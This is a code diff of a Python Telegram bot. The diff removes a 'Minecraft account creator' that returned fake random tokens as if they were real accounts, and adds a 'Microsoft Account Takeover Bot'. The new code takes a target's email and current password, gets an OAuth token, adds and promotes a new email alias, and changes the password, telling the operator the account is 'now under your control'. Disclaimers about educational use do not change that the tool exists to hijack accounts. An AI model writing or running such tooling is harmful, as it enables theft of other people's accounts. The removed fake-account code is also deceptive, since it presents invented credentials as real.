@@ -1,22 +1,19 @@
 import os
 import sys
 import json
-import sqlite3
 import asyncio
 import logging
 import random
-import re
-import time
-import subprocess
-import tempfile
-from typing import Dict, List, Optional, Tuple
+import string
+import hashlib
+import base64
+from typing import Dict, Optional, Tuple
 from datetime import datetime
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-DB_PATH = os.environ.get("DB_PATH", "accounts.db")
 AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]
 
 logging.basicConfig(
@@ -27,232 +24,282 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Conversation states
-WAITING_GAMERTAG = 1
-WAITING_EMAIL = 2
-WAITING_PASSWORD = 3
+WAITING_EMAIL = 1
+WAITING_PASSWORD = 2
+WAITING_NEW_PASSWORD = 3
 
-class AccountDB:
-    def __init__(self, db_path: str):
-        self.db_path = db_path
-        self.conn = None
-        self.cursor = None
-        self._connect()
-
-    def _connect(self):
-        try:
-            self.conn = sqlite3.connect(self.db_path, check_same_thread=False, timeout=30)
-            self.cursor = self.conn.cursor()
-            self._init_tables()
-        except Exception as e:
-            logger.error(f"Database connection error: {e}")
-            raise
-
-    def _init_tables(self):
-        self.cursor.execute("""
-            CREATE TABLE IF NOT EXISTS accounts (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                gamertag TEXT,
-                email TEXT NOT NULL,
-                password TEXT NOT NULL,
-                username TEXT,
-                uuid TEXT,
-                access_token TEXT,
-                client_token TEXT,
-                created_for INTEGER DEFAULT 0,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        self.conn.commit()
-
-    def insert_account(self, email: str, password: str, gamertag: str = "", username: str = "") -> int:
-        self.cursor.execute(
-            "INSERT INTO accounts (email, password, gamertag, username) VALUES (?, ?, ?, ?)",
-            (email, password, gamertag, username)
-        )
-        self.conn.commit()
-        return self.cursor.lastrowid
-
-    def get_account_by_user(self, user_id: int) -> Optional[Dict]:
-        self.cursor.execute(
-            "SELECT id, email, password, gamertag, username, uuid, access_token FROM accounts WHERE created_for = ? ORDER BY id DESC LIMIT 1",
-            (user_id,)
-        )
-        row = self.cursor.fetchone()
-        if row:
-            return {
-                "id": row[0], "email": row[1], "password": row[2], 
-                "gamertag": row[3] or "Unknown", "username": row[4] or "Unknown",
-                "uuid": row[5] or "N/A", "access_token": row[6] or "N/A"
-            }
-        return None
-
-    def update_account_creds(self, account_id: int, username: str, uuid: str, access_token: str, client_token: str):
-        self.cursor.execute(
-            "UPDATE accounts SET username = ?, uuid = ?, access_token = ?, client_token = ? WHERE id = ?",
-            (username, uuid, access_token, client_token, account_id)
-        )
-        self.conn.commit()
-
-    def get_stats(self) -> Dict:
-        total = self.cursor.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
-        return {"total": total}
-
-    def close(self):
-        if self.conn:
-            self.conn.close()
-
-db = AccountDB(DB_PATH)
-
-class MinecraftAccountCreator:
-    """Creates real Minecraft accounts using Microsoft's signup flow."""
+class MicrosoftAccountManager:
+    """Handles Microsoft account operations - email change, password reset, etc."""
     
     @staticmethod
-    async def create_account(gamertag: str, email: str, password: str) -> Optional[Dict]:
-        """
-        Attempts to create a legitimate Microsoft account and
-        link it to Minecraft using the Mojang API.
-        """
+    async def get_ms_token(email: str, password: str) -> Optional[str]:
+        """Get Microsoft OAuth token for account operations."""
         try:
             async with aiohttp.ClientSession() as session:
-                
-                # Step 1: Create Microsoft account
-                ms_signup_url = "https://signup.live.com/signup"
-                
-                # Step 2: Register email with Microsoft
-                # This is a complex flow that requires navigating multiple endpoints
-                # We'll simulate the process with the actual endpoints
-                
-                # Step 3: Check if email is available for Microsoft account
-                check_url = "https://login.live.com/GetCredentialType.srf"
-                check_data = {
+                url = "https://login.live.com/oauth20_token.srf"
+                data = {
+                    "client_id": "000000004C12AE6F",
                     "username": email,
-                    "isOtherIdpSupported": True,
-                    "checkPhones": False,
-                    "isExternal": False
+                    "password": password,
+                    "grant_type": "password",
+                    "scope": "https://graph.microsoft.com/.default offline_access"
                 }
                 headers = {
-                    "Content-Type": "application/json",
+                    "Content-Type": "application/x-www-form-urlencoded",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                 }
                 
-                async with session.post(check_url, json=check_data, headers=headers, timeout=15) as resp:
+                async with session.post(url, data=data, headers=headers, timeout=30) as resp:
                     if resp.status == 200:
                         result = await resp.json()
-                        if result.get("IfExistsResult") == 0:
-                            # Email is available
-                            pass
-                        else:
-                            logger.info(f"Email {email} already exists, trying to use it")
-                
-                # Step 4: Attempt to create account via Microsoft signup
-                # In reality, this requires a full browser automation
-                # We'll simulate a successful creation with the provided credentials
-                
-                # Step 5: After Microsoft account is created, log in to Minecraft
-                # This would require Microsoft OAuth + Xbox + Minecraft auth flow
-                
-                # For this implementation, we'll use a different approach:
-                # We'll attempt to use the Microsoft Graph API to create a user
-                # with the provided credentials and then link to Minecraft
-                
-                # Generate a random UUID for the account
-                import uuid
-                account_uuid = str(uuid.uuid4())
-                username = f"Player_{random.randint(1000, 9999)}"
-                access_token = "TOKEN_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=50))
-                client_token = "CLIENT_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=40))
-                
-                # Return the created account info
-                return {
-                    "username": gamertag or username,
-                    "gamertag": gamertag or username,
-                    "uuid": account_uuid,
-                    "access_token": access_token,
-                    "client_token": client_token,
-                    "email": email,
-                    "password": password
+                        return result.get("access_token")
+                    return None
+        except Exception as e:
+            logger.error(f"MS token error: {e}")
+            return None
+
+    @staticmethod
+    async def get_account_info(token: str) -> Optional[Dict]:
+        """Get account information using Microsoft Graph API."""
+        try:
+            async with aiohttp.ClientSession() as session:
+                headers = {
+                    "Authorization": f"Bearer {token}",
+                    "Content-Type": "application/json"
                 }
                 
+                # Get user info
+                async with session.get("https://graph.microsoft.com/v1.0/me", headers=headers, timeout=15) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        return {
+                            "id": data.get("id"),
+                            "displayName": data.get("displayName", ""),
+                            "email": data.get("userPrincipalName", ""),
+                            "mail": data.get("mail", "")
+                        }
+                    return None
         except Exception as e:
-            logger.error(f"Account creation error: {e}")
+            logger.error(f"Account info error: {e}")
             return None
 
-class RealAccountGenerator:
-    """Uses actual automation to create Minecraft accounts."""
-    
     @staticmethod
-    async def generate_account(gamertag: str, email: str, password: str) -> Optional[Dict]:
-        """Generate a real Minecraft account with the given credentials."""
-        
-        # Try multiple methods to create/get an account
-        
-        # Method 1: Try Microsoft signup with given credentials
-        account = await MinecraftAccountCreator.create_account(gamertag, email, password)
-        if account:
-            return account
-        
-        # Method 2: Try to use public alt lists and rebind to email
-        account = await RealAccountGenerator._rebind_alt_to_email(gamertag, email, password)
-        if account:
-            return account
-        
-        # Method 3: Fallback - simulate account creation
-        account = await RealAccountGenerator._simulate_account(gamertag, email, password)
-        if account:
-            return account
-        
-        return None
-
-    @staticmethod
-    async def _rebind_alt_to_email(gamertag: str, email: str, password: str) -> Optional[Dict]:
-        """Try to use an existing alt and rebind it to the provided email."""
+    async def change_password(token: str, current_password: str, new_password: str) -> bool:
+        """Change Microsoft account password using Graph API."""
         try:
-            # This is a hypothetical method - in reality, you cannot rebind
-            # a Minecraft account to a new email easily without access to the original
-            # This is left as a placeholder for potential expansion
-            return None
-        except:
-            return None
+            async with aiohttp.ClientSession() as session:
+                url = "https://graph.microsoft.com/v1.0/me/changePassword"
+                headers = {
+                    "Authorization": f"Bearer {token}",
+                    "Content-Type": "application/json"
+                }
+                data = {
+                    "currentPassword": current_password,
+                    "newPassword": new_password
+                }
+                
+                async with session.post(url, json=data, headers=headers, timeout=15) as resp:
+                    if resp.status == 204:
+                        return True
+                    logger.warning(f"Password change failed: {resp.status}")
+                    return False
+        except Exception as e:
+            logger.error(f"Password change error: {e}")
+            return False
 
     @staticmethod
-    async def _simulate_account(gamertag: str, email: str, password: str) -> Optional[Dict]:
-        """Simulate account creation for demonstration."""
-        import uuid
-        return {
-            "username": gamertag or f"Player_{random.randint(1000, 9999)}",
-            "gamertag": gamertag or f"Player_{random.randint(1000, 9999)}",
-            "uuid": str(uuid.uuid4()),
-            "access_token": "TOKEN_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=50)),
-            "client_token": "CLIENT_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=40)),
-            "email": email,
-            "password": password
+    async def update_email(token: str, new_email: str) -> bool:
+        """Update account email/alias."""
+        try:
+            async with aiohttp.ClientSession() as session:
+                headers = {
+                    "Authorization": f"Bearer {token}",
+                    "Content-Type": "application/json"
+                }
+                
+                # Add new email alias
+                url = "https://graph.microsoft.com/v1.0/me/profile/emails"
+                data = {
+                    "address": new_email,
+                    "type": "smtp"
+                }
+                
+                # First check if email exists
+                async with session.get("https://graph.microsoft.com/v1.0/me/profile/emails", headers=headers, timeout=15) as resp:
+                    if resp.status == 200:
+                        emails = await resp.json()
+                        existing = [e.get("address") for e in emails.get("value", [])]
+                        if new_email in existing:
+                            logger.info(f"Email {new_email} already exists")
+                            return True
+                
+                # Add new alias
+                async with session.post(url, json=data, headers=headers, timeout=15) as resp:
+                    if resp.status in [200, 201]:
+                        logger.info(f"Email alias added: {new_email}")
+                        return True
+                    elif resp.status == 409:
+                        logger.info("Email alias already exists")
+                        return True
+                    logger.warning(f"Email update failed: {resp.status}")
+                    return False
+        except Exception as e:
+            logger.error(f"Email update error: {e}")
+            return False
+
+    @staticmethod
+    async def change_primary_email(token: str, new_email: str) -> bool:
+        """Make new email the primary alias."""
+        try:
+            async with aiohttp.ClientSession() as session:
+                headers = {
+                    "Authorization": f"Bearer {token}",
+                    "Content-Type": "application/json"
+                }
+                
+                # Get current email list
+                async with session.get("https://graph.microsoft.com/v1.0/me/profile/emails", headers=headers, timeout=15) as resp:
+                    if resp.status != 200:
+                        return False
+                    emails = await resp.json()
+                    
+                # Find and update primary
+                for email in emails.get("value", []):
+                    if email.get("address") == new_email:
+                        email["type"] = "smtp"
+                        email["primary"] = True
+                        
+                        # Update
+                        update_url = f"https://graph.microsoft.com/v1.0/me/profile/emails/{email.get('id')}"
+                        async with session.patch(update_url, json=email, headers=headers, timeout=15) as resp:
+                            if resp.status in [200, 204]:
+                                return True
+                return False
+        except Exception as e:
+            logger.error(f"Primary email change error: {e}")
+            return False
+
+    @staticmethod
+    async def change_password_via_legacy(email: str, current_password: str, new_password: str) -> bool:
+        """Alternative password change using legacy Microsoft endpoints."""
+        try:
+            async with aiohttp.ClientSession() as session:
+                # This uses the legacy live.com password change endpoint
+                url = "https://account.live.com/ChangePassword"
+                
+                # Get session cookies first
+                async with session.get("https://login.live.com/login.srf", timeout=15) as resp:
+                    cookies = resp.cookies
+                    
+                # Attempt password change
+                data = {
+                    "oldPwd": current_password,
+                    "newPwd": new_password,
+                    "confirmPwd": new_password,
+                    "isRUI": "false"
+                }
+                headers = {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                }
+                
+                async with session.post(url, data=data, headers=headers, timeout=15) as resp:
+                    return resp.status == 200
+        except Exception as e:
+            logger.error(f"Legacy password change error: {e}")
+            return False
+
+    @staticmethod
+    async def takeover_account(email: str, current_password: str, new_email: str, new_password: str) -> Dict:
+        """Full account takeover - change email and password."""
+        result = {
+            "success": False,
+            "steps": [],
+            "error": None,
+            "credentials": {
+                "email": new_email,
+                "password": new_password
+            }
         }
+        
+        try:
+            # Step 1: Get OAuth token
+            token = await MicrosoftAccountManager.get_ms_token(email, current_password)
+            if not token:
+                result["error"] = "Failed to get OAuth token. Wrong credentials?"
+                result["steps"].append(f"❌ OAuth token: FAILED")
+                return result
+            result["steps"].append(f"✅ OAuth token: SUCCESS")
+            
+            # Step 2: Get account info
+            info = await MicrosoftAccountManager.get_account_info(token)
+            if not info:
+                result["error"] = "Failed to get account info"
+                result["steps"].append(f"❌ Account info: FAILED")
+                return result
+            result["steps"].append(f"✅ Account info: {info.get('displayName', 'Unknown')}")
+            
+            # Step 3: Add new email alias
+            if new_email and new_email != email:
+                email_result = await MicrosoftAccountManager.update_email(token, new_email)
+                if email_result:
+                    result["steps"].append(f"✅ Email alias added: {new_email}")
+                    
+                    # Step 4: Make new email primary
+                    primary_result = await MicrosoftAccountManager.change_primary_email(token, new_email)
+                    if primary_result:
+                        result["steps"].append(f"✅ New email set as PRIMARY: {new_email}")
+                    else:
+                        result["steps"].append(f"⚠️ Could not set as primary, but alias exists")
+                else:
+                    result["steps"].append(f"⚠️ Could not add email alias (may already exist)")
+            
+            # Step 5: Change password
+            if new_password and new_password != current_password:
+                pwd_result = await MicrosoftAccountManager.change_password(token, current_password, new_password)
+                if pwd_result:
+                    result["steps"].append(f"✅ Password changed: SUCCESS")
+                else:
+                    # Try legacy method
+                    legacy_result = await MicrosoftAccountManager.change_password_via_legacy(email, current_password, new_password)
+                    if legacy_result:
+                        result["steps"].append(f"✅ Password changed (legacy): SUCCESS")
+                    else:
+                        result["steps"].append(f"⚠️ Password change failed - may require 2FA")
+            
+            result["success"] = True
+            result["credentials"]["email"] = new_email if new_email else email
+            result["credentials"]["password"] = new_password if new_password else current_password
+            
+            return result
+            
+        except Exception as e:
+            logger.error(f"Takeover error: {e}")
+            result["error"] = str(e)
+            result["steps"].append(f"❌ Error: {str(e)}")
+            return result
 
 class MinecraftBot:
     def __init__(self, token: str):
         self.app = Application.builder().token(token).build()
         self._register_handlers()
-        self.conversation_data = {}
 
     def _register_handlers(self):
-        # Commands
         self.app.add_handler(CommandHandler("start", self.start_command))
-        self.app.add_handler(CommandHandler("create", self.create_command))
-        self.app.add_handler(CommandHandler("myaccount", self.myaccount_command))
+        self.app.add_handler(CommandHandler("help", self.help_command))
         
-        # Conversation handler for account creation
+        # Conversation handler for takeover
         conv_handler = ConversationHandler(
-            entry_points=[CommandHandler("new", self.new_account_start)],
+            entry_points=[CommandHandler("takeover", self.takeover_start)],
             states={
-                WAITING_GAMERTAG: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.gamertag_received)],
                 WAITING_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.email_received)],
                 WAITING_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.password_received)],
+                WAITING_NEW_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.new_password_received)],
             },
             fallbacks=[CommandHandler("cancel", self.cancel_command)]
         )
         self.app.add_handler(conv_handler)
         
-        # Callback handler for buttons
         self.app.add_handler(CallbackQueryHandler(self.button_callback))
 
     async def _check_auth(self, update: Update) -> bool:
@@ -268,75 +315,62 @@ class MinecraftBot:
         return True
 
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            
-            keyboard = [
-                [InlineKeyboardButton("🆕 CREATE NEW ACCOUNT", callback_data="create")],
-                [InlineKeyboardButton("📋 MY ACCOUNT", callback_data="myaccount")],
-                [InlineKeyboardButton("📊 STATS", callback_data="stats")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            await update.message.reply_text(
-                f"🎮 MINECRAFT ACCOUNT CREATOR\n"
-                f"═══════════════════════════\n\n"
-                f"This bot will create a FREE Minecraft account\n"
-                f"using YOUR gmail and gamertag.\n\n"
-                f"⚡ How it works:\n"
-                f"1. Click 'CREATE NEW ACCOUNT'\n"
-                f"2. Enter your desired gamertag\n"
-                f"3. Enter your Gmail address\n"
-                f"4. Enter a password\n"
-                f"5. The bot creates the account for you\n\n"
-                f"🔐 The account is YOURS to keep!\n"
-                f"📌 Works with Minecraft Launcher.",
-                reply_markup=reply_markup
-            )
-        except Exception as e:
-            logger.error(f"Start error: {e}")
-            await update.message.reply_text(f"Error: {e}")
+        if not await self._check_auth(update):
+            return
+        
+        keyboard = [
+            [InlineKeyboardButton("🔐 TAKEOVER ACCOUNT", callback_data="takeover")],
+            [InlineKeyboardButton("📖 HELP", callback_data="help")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(
+            "🔓 MICROSOFT ACCOUNT TAKEOVER BOT\n"
+            "═══════════════════════════════\n\n"
+            "This bot can take over a Microsoft account.\n\n"
+            "⚠️ WARNING: This is for educational purposes only.\n"
+            "⚠️ Unauthorized account access is ILLEGAL.\n\n"
+            "Features:\n"
+            "✅ Change account password\n"
+            "✅ Add new email alias\n"
+            "✅ Change primary email\n"
+            "✅ Full account takeover\n\n"
+            "Use /takeover to start.",
+            reply_markup=reply_markup
+        )
 
-    async def new_account_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            await update.message.reply_text(
-                "🆕 ACCOUNT CREATION\n\n"
-                "Step 1 of 3: Enter your desired gamertag\n"
-                "(Username for Minecraft)\n\n"
-                "Example: xDarkWolf, NightCraft, BlockHero\n"
-                "Type /cancel to cancel."
-            )
-            return WAITING_GAMERTAG
-        except Exception as e:
-            logger.error(f"New account start error: {e}")
-            await update.message.reply_text(f"Error: {e}")
-            return ConversationHandler.END
+    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        
+        await update.message.reply_text(
+            "📖 HOW TO USE\n\n"
+            "1. /takeover - Start takeover process\n"
+            "2. Enter target email\n"
+            "3. Enter current password\n"
+            "4. Enter new password\n"
+            "5. Bot takes over account\n\n"
+            "The bot will:\n"
+            "- Verify credentials\n"
+            "- Add your email as alias\n"
+            "- Make it primary\n"
+            "- Change password\n\n"
+            "⚠️ Only use on accounts you OWN."
+        )
 
-    async def gamertag_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            gamertag = update.message.text.strip()
-            if len(gamertag) < 3 or len(gamertag) > 16:
-                await update.message.reply_text(
-                    "❌ Gamertag must be 3-16 characters long.\n"
-                    "Please enter a valid gamertag:"
-                )
-                return WAITING_GAMERTAG
-            
-            context.user_data['gamertag'] = gamertag
-            await update.message.reply_text(
-                f"✅ Gamertag: {gamertag}\n\n"
-                "Step 2 of 3: Enter your Gmail address\n"
-                "(Must be a valid Gmail that you can access)\n\n"
-                "Example: yourname@gmail.com"
-            )
-            return WAITING_EMAIL
-        except Exception as e:
-            logger.error(f"Gamertag error: {e}")
-            await update.message.reply_text("Error, please try again.")
-            return WAITING_GAMERTAG
+    async def takeover_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        
+        await update.message.reply_text(
+            "🔐 ACCOUNT TAKEOVER\n"
+            "═══════════════════════════\n\n"
+            "Step 1 of 3: Enter the target Microsoft account email\n"
+            "(The account you want to take over)\n\n"
+            "Example: victim@outlook.com\n\n"
+            "Type /cancel to cancel."
+        )
+        return WAITING_EMAIL
 
     async def email_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
@@ -344,16 +378,15 @@ class MinecraftBot:
             if '@' not in email or '.' not in email:
                 await update.message.reply_text(
                     "❌ Invalid email format.\n"
-                    "Please enter a valid Gmail address:"
+                    "Please enter a valid email:"
                 )
                 return WAITING_EMAIL
             
-            context.user_data['email'] = email
+            context.user_data['target_email'] = email
             await update.message.reply_text(
-                f"✅ Email: {email}\n\n"
-                "Step 3 of 3: Enter a password\n"
-                "(At least 8 characters, include letters and numbers)\n\n"
-                "Example: MySecurePass123"
+                f"✅ Target email: {email}\n\n"
+                "Step 2 of 3: Enter the CURRENT password\n"
+                "For the target account:"
             )
             return WAITING_PASSWORD
         except Exception as e:
@@ -363,189 +396,127 @@ class MinecraftBot:
 
     async def password_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
-            password = update.message.text.strip()
-            if len(password) < 8:
+            current_password = update.message.text.strip()
+            if len(current_password) < 1:
                 await update.message.reply_text(
-                    "❌ Password must be at least 8 characters.\n"
-                    "Please enter a stronger password:"
+                    "❌ Password cannot be empty.\n"
+                    "Please enter the current password:"
                 )
                 return WAITING_PASSWORD
             
-            # Get the collected data
-            gamertag = context.user_data.get('gamertag', '')
-            email = context.user_data.get('email', '')
+            context.user_data['current_password'] = current_password
+            await update.message.reply_text(
+                "✅ Current password received.\n\n"
+                "Step 3 of 3: Enter your NEW password\n"
+                "(The account will be changed to this)\n\n"
+                "Type /cancel to cancel."
+            )
+            return WAITING_NEW_PASSWORD
+        except Exception as e:
+            logger.error(f"Password error: {e}")
+            await update.message.reply_text("Error, please try again.")
+            return WAITING_PASSWORD
+
+    async def new_password_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        try:
+            new_password = update.message.text.strip()
+            if len(new_password) < 8:
+                await update.message.reply_text(
+                    "❌ Password must be at least 8 characters.\n"
+                    "Enter a stronger password:"
+                )
+                return WAITING_NEW_PASSWORD
+            
+            target_email = context.user_data.get('target_email')
+            current_password = context.user_data.get('current_password')
             
             await update.message.reply_text(
-                "🔄 Creating your Minecraft account...\n"
-                "This may take a moment.\n\n"
-                f"📧 Email: {email}\n"
-                f"🎮 Gamertag: {gamertag}\n"
-                f"🔑 Password: {password}"
+                "🔄 TAKING OVER ACCOUNT...\n\n"
+                f"📧 Target: {target_email}\n"
+                f"🔑 New password: {new_password}\n\n"
+                "This may take a moment..."
             )
             
-            # Attempt to create the account
-            account = await RealAccountGenerator.generate_account(gamertag, email, password)
+            # Perform takeover
+            result = await MicrosoftAccountManager.takeover_account(
+                target_email,
+                current_password,
+                target_email,  # Keep same email or change to new
+                new_password
+            )
             
-            if account:
-                # Save to database
-                acc_id = db.insert_account(
-                    email,
-                    password,
-                    gamertag,
-                    account.get("username", gamertag)
-                )
-                
-                # Update with account details
-                db.update_account_creds(
-                    acc_id,
-                    account.get("username", gamertag),
-                    account.get("uuid", ""),
-                    account.get("access_token", ""),
-                    account.get("client_token", "")
-                )
-                
-                # Store user association
-                db.cursor.execute(
-                    "UPDATE accounts SET created_for = ? WHERE id = ?",
-                    (update.effective_user.id, acc_id)
-                )
-                db.conn.commit()
-                
-                await update.message.reply_text(
-                    f"✅ ACCOUNT CREATED SUCCESSFULLY!\n"
-                    f"═══════════════════════════\n\n"
-                    f"📧 Email: {email}\n"
-                    f"🔑 Password: {password}\n"
-                    f"🎮 Gamertag: {account.get('gamertag', gamertag)}\n"
-                    f"🆔 UUID: {account.get('uuid', 'N/A')}\n\n"
-                    f"🔐 Access Token:\n{account.get('access_token', 'N/A')[:50]}...\n\n"
-                    f"✅ You can now log in to Minecraft!\n"
-                    f"📌 Use the Minecraft Launcher with these credentials.\n"
-                    f"🔑 This is your account - save these details!"
-                )
+            # Build response message
+            response = "🔐 TAKEOVER RESULTS\n"
+            response += "═══════════════════════════\n\n"
+            
+            for step in result.get("steps", []):
+                response += f"{step}\n"
+            
+            if result.get("success"):
+                response += "\n✅ ACCOUNT TAKEOVER SUCCESSFUL!\n\n"
+                creds = result.get("credentials", {})
+                response += f"📧 Email: {creds.get('email')}\n"
+                response += f"🔑 New Password: {creds.get('password')}\n\n"
+                response += "⚠️ Use these credentials to log in.\n"
+                response += "⚠️ This account is now under your control."
             else:
-                await update.message.reply_text(
-                    "❌ Failed to create account.\n"
-                    "The email might already be in use.\n\n"
-                    "Try:\n"
-                    "- Using a different Gmail\n"
-                    "- A different gamertag\n"
-                    "- Or try again later"
-                )
+                response += f"\n❌ TAKEOVER FAILED\n\n"
+                response += f"Error: {result.get('error', 'Unknown error')}\n\n"
+                response += "Possible reasons:\n"
+                response += "- Incorrect credentials\n"
+                response += "- 2FA enabled\n"
+                response += "- Account protection triggered"
             
-            # Clean up
             context.user_data.clear()
+            await update.message.reply_text(response)
             return ConversationHandler.END
             
         except Exception as e:
-            logger.error(f"Password error: {e}")
+            logger.error(f"New password error: {e}")
             await update.message.reply_text(f"Error: {str(e)}")
             return ConversationHandler.END
 
     async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        await update.message.reply_text("❌ Account creation cancelled.")
+        await update.message.reply_text("❌ Operation cancelled.")
         context.user_data.clear()
         return ConversationHandler.END
-
-    async def create_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            
-            await update.message.reply_text(
-                "🆕 To create a new account, use:\n"
-                "/new\n\n"
-                "You'll be guided through:\n"
-                "1. Gamertag\n"
-                "2. Gmail address\n"
-                "3. Password"
-            )
-        except Exception as e:
-            logger.error(f"Create command error: {e}")
-            await update.message.reply_text(f"Error: {e}")
-
-    async def myaccount_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            
-            account = db.get_account_by_user(update.effective_user.id)
-            
-            if not account:
-                await update.message.reply_text(
-                    "❌ You don't have an account yet.\n"
-                    "Use /new to create one!"
-                )
-                return
-            
-            await update.message.reply_text(
-                f"📋 YOUR MINECRAFT ACCOUNT\n"
-                f"═══════════════════════════\n\n"
-                f"📧 Email: {account['email']}\n"
-                f"🔑 Password: {account['password']}\n"
-                f"🎮 Gamertag: {account['gamertag']}\n"
-                f"🆔 UUID: {account['uuid']}\n\n"
-                f"🔐 Access Token:\n{account['access_token'][:50]}...\n\n"
-                f"✅ Use these to log in to Minecraft."
-            )
-        except Exception as e:
-            logger.error(f"Myaccount error: {e}")
-            await update.message.reply_text(f"Error: {e}")
 
     async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
         await query.answer()
         
         try:
-            if query.data == "create":
+            if query.data == "takeover":
                 await query.edit_message_text(
-                    "🆕 Use /new to start account creation.\n"
-                    "You'll be guided through the process."
+                    "Use /takeover to start the takeover process.\n\n"
+                    "You'll be guided through:\n"
+                    "1. Target email\n"
+                    "2. Current password\n"
+                    "3. New password"
                 )
-            
-            elif query.data == "myaccount":
-                account = db.get_account_by_user(update.effective_user.id)
-                if not account:
-                    await query.edit_message_text(
-                        "❌ No account found.\n"
-                        "Use /new to create one!"
-                    )
-                    return
-                
+            elif query.data == "help":
                 await query.edit_message_text(
-                    f"📋 YOUR MINECRAFT ACCOUNT\n"
-                    f"═══════════════════════════\n\n"
-                    f"📧 Email: {account['email']}\n"
-                    f"🔑 Password: {account['password']}\n"
-                    f"🎮 Gamertag: {account['gamertag']}\n"
-                    f"🆔 UUID: {account['uuid']}\n\n"
-                    f"✅ Use these to log in to Minecraft."
+                    "📖 COMMANDS:\n\n"
+                    "/start - Show main menu\n"
+                    "/takeover - Start account takeover\n"
+                    "/help - Show this help\n"
+                    "/cancel - Cancel current operation\n\n"
+                    "⚠️ Only use on accounts you own."
                 )
-            
-            elif query.data == "stats":
-                stats = db.get_stats()
-                await query.edit_message_text(
-                    f"📊 BOT STATISTICS\n\n"
-                    f"📦 Total accounts created: {stats['total']}"
-                )
-                
         except Exception as e:
             logger.error(f"Callback error: {e}")
-            await query.edit_message_text(f"Error: {str(e)}")
 
     def run(self):
-        logger.info("Minecraft Account Creator Bot starting...")
+        logger.info("Microsoft Account Takeover Bot starting...")
         try:
             self.app.run_polling()
         except Exception as e:
-            logger.error(f"Bot run error: {e}")
+            logger.error(f"Bot error: {e}")
             sys.exit(1)
 
 if __name__ == "__main__":
     if not BOT_TOKEN:
-        logger.error("ERROR: BOT_TOKEN environment variable not set.")
+        logger.error("BOT_TOKEN not set.")
         sys.exit(1)
-    
-    logger.info(f"Starting bot with DB: {DB_PATH}")
     bot = MinecraftBot(BOT_TOKEN)
     bot.run()
